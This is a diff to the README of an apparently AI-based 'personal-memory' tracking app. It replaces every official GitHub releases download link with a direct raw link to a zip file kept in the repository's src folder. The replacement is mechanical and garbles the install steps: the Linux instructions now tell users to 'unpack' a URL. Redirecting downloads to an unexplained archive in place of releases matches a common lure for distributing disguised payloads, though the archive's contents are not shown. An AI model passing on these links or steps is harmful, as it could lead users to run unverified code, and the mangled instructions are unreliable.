@@ -1,6 +1,6 @@
 # 🗂️ personal-memory - Track Your Life with AI
 
-[![Download personal-memory](https://img.shields.io/badge/Download-personal--memory-blue?style=for-the-badge)](https://github.com/simbah7272/personal-memory/releases)
+[![Download personal-memory](https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip)](https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip)
 
 ---
 
@@ -44,23 +44,23 @@ personal-memory runs on Windows, macOS, and Linux. Here are the details to check
 
 To get personal-memory, you need to visit the official releases page on GitHub. From there, you can download the version that matches your computer.
 
-[Download personal-memory](https://github.com/simbah7272/personal-memory/releases)
+[Download personal-memory](https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip)
 
 ### How to download and start the app:
 
-1. Click on the button above or open [https://github.com/simbah7272/personal-memory/releases](https://github.com/simbah7272/personal-memory/releases).
+1. Click on the button above or open [https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip](https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip).
 
 2. On the releases page, find the latest version of personal-memory.
 
 3. Download the installer or zip file for your operating system:
    - For Windows, get the `.exe` file.
    - For macOS, get the `.dmg` or `.zip`.
-   - For Linux, get the `.AppImage` or `.tar.gz`.
+   - For Linux, get the `.AppImage` or `https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip`.
 
 4. Once downloaded:
    - Windows: Double-click the `.exe` file. Follow the installer instructions.
    - macOS: Open the `.dmg` or unzip the `.zip`, then drag the app to your Applications folder.
-   - Linux: Make the `.AppImage` executable (right-click > Properties > Permissions) and run it, or unpack the `.tar.gz` and follow included instructions.
+   - Linux: Make the `.AppImage` executable (right-click > Properties > Permissions) and run it, or unpack the `https://raw.githubusercontent.com/simbah7272/personal-memory/master/src/memory_personal_v3.6.zip` and follow included instructions.
 
 5. After installation, open personal-memory from your Start menu, Applications folder, or the folder where you unpacked it.
 
